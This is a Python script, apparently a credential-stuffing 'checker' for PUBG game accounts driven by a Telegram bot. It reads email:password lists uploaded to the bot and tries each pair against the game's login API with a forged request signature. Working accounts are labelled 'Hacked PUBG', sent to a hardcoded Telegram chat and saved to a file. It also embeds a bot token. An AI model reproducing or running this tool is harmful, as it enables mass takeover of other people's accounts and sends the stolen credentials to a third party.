import random,string
import requests,hashlib,random,string,time

import telebot





r = requests.session()
print("""
--------------------------------------------------


██████╗ ██╗   ██╗██████╗  ██████╗
██╔══██╗██║   ██║██╔══██╗██╔════╝ 
██████╔╝██║   ██║██████╔╝██║  ███╗
██╔═══╝ ██║   ██║██╔══██╗██║   ██║
██║     ╚██████╔╝██████╔╝╚██████╔╝
╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ 
        
        
       BY : @StyleGame
 --------------------------------------------------
""")
#############


ID='1065073806'
token ='1806649080:AAFm6VdpWvxM1_1X2Htc4VIHbEPqF7hM80Y'

bot = telebot.TeleBot(token)



headPUB = {
  "Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""
\033[0;32m[✓] Hacked PUBG :
[✓] Email: {eml}
[✓] Pass: {pas}
━━━━━━━━━━━━━"""
  NO = f"""
\033[0;31m[-] NOT Hacked PUBG :
[-] Email: {eml}
[-] Pass: {pas}
━━━━━━━━━━━━━"""
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"Success"' in GO:
    print(YES)
    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY @Style_Game 💸')
    with open('NWE-PUBG.txt', 'a') as x:
      x.write(eml+':'+pas+' |@StyleGame  @Style_Game0\n')
  else:
    print(NO)









@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
  bot.reply_to(message, "Hi StyleGame, how are you doing?")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
  if message.text=="Checker":
      bot.reply_to(message, "ok")
      #F = "p.text"
      #def FILname():
      F = "p.txt"
      try:
        for x in open(F,'r').read().splitlines():
          email = x.split(":")[0]
          pess = x.split(":")[1]
          CHECK(email,pess)
      except FileNotFoundError:
        print('\n[-] The file name is incorrect !\n')
        return FILname()
  else:
   bot.reply_to(message, "Not Checker") 

#FILname()





@bot.message_handler(content_types=['document'])
def name(c):
  print("Go")
  print(c.document.file_id)
  
  raw=c.document.file_id
  path = raw + ".txt"
  file_info = bot.get_file(raw)
  downloaded_file = bot.download_file(file_info.file_path)
  with open("p.txt", 'wb') as new_file:
    new_file.write(downloaded_file)
  bot.reply_to(c, "Downloaded")     











bot.polling()
